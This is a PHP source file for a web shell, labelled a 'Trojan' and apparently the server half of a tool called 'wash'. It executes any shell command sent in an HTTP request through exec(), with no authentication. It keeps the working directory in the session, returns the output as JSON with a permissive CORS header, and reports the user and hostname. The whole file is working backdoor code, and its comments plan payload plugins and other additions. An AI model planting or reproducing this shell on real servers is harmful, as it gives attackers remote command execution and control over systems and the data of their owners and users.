<?php

class Payload{
    public $description = 'A description of the payload goes here.';
    public $options = array();
    public function execute(){
        return 'hacked';
    }
}

// @todo: probably need to track some kind of options hash over here
// @todo: it would be awesome to build a compatiblity layer for programs like 
// top that don't (I don't think) write to stdout
// @note @todo: all trojans should support some kind of "help" command to show
// you what payloads they're carrying
// @todo: it would be rad as hell if I could get tab-completion to work

class Trojan{
    private $command         = '';
    private $cwd             = '';
    private $output          = '';
    private $prompt_context  = '';
    private $payloads        = array();
    private $options         = array(
        'redirect_stderr_to_stdout'  => true,
    );
    private $output_raw      = array();

    /**
     * A generic constructor
     */
    public function __construct(){
        # Require that $this->cwd always contains a meaningful value
        $this->cwd = trim(`pwd`);
    }

    /**
     * Processes commands sent from the wash client
     *
     * @param string $json             JSON from the wash client
     */
    public function process_command($json){
        # @todo (probably here: decrypt the command)
        # process shell commands
        if($json['type'] == 'shell'){
            $this->process_shell_command($json['cmd']);
        }

        # process wash commands
        if($json['type'] == 'wash'){
            $this->process_wash_command($json['cmd']);
        }
    }

    /**
     * Processes a command from the wash client
     *
     * @param string $command          A command - this will change
     */
    private function process_shell_command($command){
        # emulate cwd persistence
        if(isset($_SESSION['cwd'])){ $this->cwd = $_SESSION['cwd']; }

        # buffer the command from the client, in case we ever want to refer
        # back to it
        $this->command = $command;

        /* @note: In order to get current directory persistence to work, I need 
         * to inject some `cd` and `pwd` commands around the command sent from 
         * the wash client. */

        # optionally (by default) redirect stderr to stdout
        if($this->options['redirect_stderr_to_stdout']){
            $command  = "cd {$this->cwd}; $command 2>&1; pwd";
        } else {
            $command  = "cd {$this->cwd}; $command; pwd";
        }
        exec($command, $this->output_raw);

        # parse the results
        $this->cwd    = array_pop($this->output_raw);
        $this->output = join($this->output_raw, "\n");

        # save the cwd
        $_SESSION['cwd'] = $this->cwd;
    }

    /**
     * Processes a wash command
     *
     * @param string $command          The wash command to process
     */
    private function process_wash_command($command){
        return true;
    }

    /**
     * Sends a response back to the wash client
     */
    public function send_response(){
        /* This header prevents the wash client from malfunctioning due to the 
         * Same-Origin Policy. @see: http://enable-cors.org/ */
        header('Access-Control-Allow-Origin: *');

        //$error    = '';
        $response = array(
            'prompt_context' => $this->get_prompt_context(),
            'output'         => $this->output,
            //'error'          => $error,
        );

        # assemble and send a JSON-encoded response
        $json = json_encode($response);
        echo $json;
        die();
    }

    /**
     * Assembles the prompt context to return to the wash client
     *
     * @return string $prompt_context  The prompt context
     */
    private function get_prompt_context(){
        // assemble the prompt context
        $whoami               =  trim(`whoami`);
        $hostname             =  gethostname();
        $line_terminator      =  ($whoami ===  'root') ? '#' : '$' ;
        $this->prompt_context =  "{$whoami}@{$hostname}:{$this->cwd}{$line_terminator}";
        return $this->prompt_context;
    }
}

/* ---------- Procedural code starts here ---------- */
session_start();
$trojan = new Trojan();
$trojan->process_command($_REQUEST);
$trojan->send_response();
